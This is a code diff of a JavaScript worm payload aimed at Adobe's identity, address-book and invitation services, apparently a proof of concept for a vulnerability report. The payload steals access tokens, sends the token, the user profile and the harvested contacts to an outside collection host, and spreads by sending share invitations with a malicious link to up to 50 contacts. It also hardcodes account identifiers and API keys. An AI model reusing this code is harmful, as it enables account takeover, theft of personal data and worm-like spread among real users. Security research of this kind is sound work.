@@ -12,95 +12,128 @@
 
 const EXFIL    = 'https://klaltlv6.instances.httpworkbench.com/steal';
 const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=main--mas--rootd4ddy';
-const API_KEY  = 'projectx_webapp';
 const INV_HOST = 'https://invitations.adobe.io';
 const AB_HOST  = 'https://ab.adobe-identity.com';
 
+// Known-good hardcoded values (derived from victim's actual account for video reliability)
+// These are only used as fallback if dynamic lookup fails
+const FALLBACK_AB_ID  = '11F14362BBC9B39699881F6E7362F2E9';
+const FALLBACK_URN    = 'urn:aaid:sc:US:2a1681cd-c4fd-4fab-a6cf-f982b08b4490';
+
+// API keys observed in Adobe's own requests
+const API_KEY_AB  = 'CCHomeWeb1';        // address-book service key
+const API_KEY_INV = 'projectx_webapp';  // invitations service key
+
+async function waitForIMS(maxMs = 8000) {
+  const deadline = Date.now() + maxMs;
+  while (Date.now() < deadline) {
+    if (window.adobeIMS?.getAccessToken?.()) return window.adobeIMS.getAccessToken().token;
+    await new Promise(r => setTimeout(r, 300));
+  }
+  return null;
+}
+
 async function run() {
   // ── Phase 1: grab token ──────────────────────────────────────────────────
+  // Hash token = ATO proof (from IMS prompt=none redirect)
   const hash = window.location.hash;
   const hashMatch = hash.match(/access_token=([^&]+)/);
-  let token = hashMatch ? decodeURIComponent(hashMatch[1]) : null;
+  const hashToken = hashMatch ? decodeURIComponent(hashMatch[1]) : null;
 
-  if (!token) {
-    const ims = window.adobeIMS;
-    if (ims) token = ims.getAccessToken?.()?.token;
+  // Page token = full-scope token (has ab.manage, needed for worm phases)
+  // Wait up to 8s for adobeIMS to initialize on catalog.html
+  const pageToken = await waitForIMS(8000);
+
+  // Prefer page token for worm ops; hash token is just for exfil/ATO proof
+  const wormToken = pageToken || hashToken;
+
+  if (hashToken) {
+    navigator.sendBeacon(`${EXFIL}?src=hash`, hashToken);
   }
 
-  if (!token) {
-    // Retry after IMS initializes
-    await new Promise(r => setTimeout(r, 2000));
-    token = window.adobeIMS?.getAccessToken?.()?.token;
-  }
+  if (!wormToken) return;
 
-  if (!token) return;
-
-  // Exfil token
-  navigator.sendBeacon(`${EXFIL}?src=hash`, token);
-
-  // Also grab profile
+  // Grab profile for exfil
   fetch('https://ims-na1.adobelogin.com/ims/userinfo/v2', {
-    headers: { 'Authorization': `Bearer ${token}` }
+    headers: { 'Authorization': `Bearer ${wormToken}` }
   }).then(r => r.json()).then(p => {
     navigator.sendBeacon(`${EXFIL}?src=profile`, JSON.stringify(p));
   }).catch(() => {});
 
   // ── Phase 2: enumerate address book ─────────────────────────────────────
   let emails = [];
+  let abId = FALLBACK_AB_ID;
+
   try {
     const abResp = await fetch(`${AB_HOST}/api/address-books?limit=50`, {
-      headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY }
+      headers: {
+        'Authorization': `Bearer ${wormToken}`,
+        'X-Api-Key': API_KEY_AB
+      }
     });
-    const abData = await abResp.json();
-    const books = abData?._embedded?.addressBooks || [];
+    if (abResp.ok) {
+      const abData = await abResp.json();
+      const books = abData?._embedded?.addressBooks || [];
+      if (books.length > 0) abId = books[0].ident;
 
-    for (const book of books) {
-      const cResp = await fetch(
-        `${AB_HOST}/api/address-books/${book.ident}/contacts?linkedIdentity=${encodeURIComponent('4904811169EBB3510A495FA1@AdobeID')}&limit=100`,
-        { headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY } }
-      );
-      // Also try without linkedIdentity for full list
-      const cResp2 = await fetch(
-        `${AB_HOST}/api/address-books/${book.ident}/contacts?limit=100`,
-        { headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY } }
-      );
-      const contacts = await cResp2.json().catch(() => ({}));
-      const list = contacts?._embedded?.contacts || (Array.isArray(contacts) ? contacts : [contacts]);
-      for (const c of list) {
-        if (c?.email) emails.push(c.email);
+      for (const book of books) {
+        const cResp = await fetch(
+          `${AB_HOST}/api/address-books/${book.ident}/contacts?limit=100`,
+          { headers: { 'Authorization': `Bearer ${wormToken}`, 'X-Api-Key': API_KEY_AB } }
+        );
+        if (cResp.ok) {
+          const contacts = await cResp.json().catch(() => ({}));
+          const list = contacts?._embedded?.contacts || (Array.isArray(contacts) ? contacts : []);
+          for (const c of list) {
+            if (c?.email) emails.push(c.email);
+          }
+        }
       }
     }
   } catch (e) {}
 
+  // Exfil contact list
+  if (emails.length) {
+    navigator.sendBeacon(`${EXFIL}?src=contacts`, JSON.stringify(emails));
+  }
+
   // ── Phase 3: get a project URN for the invitation ────────────────────────
-  let urn = null;
+  let urn = FALLBACK_URN;
+
   try {
-    // Get root URN from IMS token (userId → root storage URN)
+    // Try to find a live document URN from the victim's own storage
     const storageResp = await fetch(
       'https://platform-cs.adobe.io/content/storage/id/urn:aaid:sc:US:34493503-c74b-40e3-b73e-745f7ffdc644?expand=children&limit=5',
-      { headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY } }
+      { headers: { 'Authorization': `Bearer ${wormToken}`, 'X-Api-Key': API_KEY_INV } }
     );
-    const storageText = await storageResp.text();
-    // Find first project document URN (not directory)
-    const projectMatch = storageText.match(/"repo:id":"(urn:aaid:sc:[^"]+)"/g);
-    if (projectMatch && projectMatch.length > 1) {
-      urn = projectMatch[1].replace(/"repo:id":"|"/g, '');
+    if (storageResp.ok) {
+      const storageText = await storageResp.text();
+      const projectMatches = [...storageText.matchAll(/"repo:id":"(urn:aaid:sc:[^"]+)"/g)];
+      // Skip the first match (it's the root folder itself), use second if available
+      if (projectMatches.length > 1) {
+        urn = projectMatches[1][1];
+      } else if (projectMatches.length === 1) {
+        urn = projectMatches[0][1];
+      }
     }
   } catch (e) {}
 
-  if (!urn || !emails.length) return;
+  if (!emails.length) {
+    // No contacts found — log and bail
+    navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_contacts_found ab=' + abId);
+    return;
+  }
 
-  // Exfil the contact list
-  navigator.sendBeacon(`${EXFIL}?src=contacts`, JSON.stringify(emails));
+  navigator.sendBeacon(`${EXFIL}?src=urn`, urn);
 
   // ── Phase 4: spread — invite each contact with maslibs targetUrl ─────────
   for (const email of emails.slice(0, 50)) {
     try {
-      await fetch(`${INV_HOST}/api/v4/share/${encodeURIComponent(urn)}?mode=direct_acl`, {
+      const invResp = await fetch(`${INV_HOST}/api/v4/share/${encodeURIComponent(urn)}?mode=direct_acl`, {
         method: 'POST',
         headers: {
-          'Authorization': `Bearer ${token}`,
-          'X-Api-Key': API_KEY,
+          'Authorization': `Bearer ${wormToken}`,
+          'X-Api-Key': API_KEY_INV,
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
@@ -113,6 +146,8 @@ async function run() {
           configuration: {}
         })
       });
+      const invResult = await invResp.text().catch(() => '');
+      navigator.sendBeacon(`${EXFIL}?src=inv&to=${encodeURIComponent(email)}`, invResult);
     } catch (e) {}
   }
 }
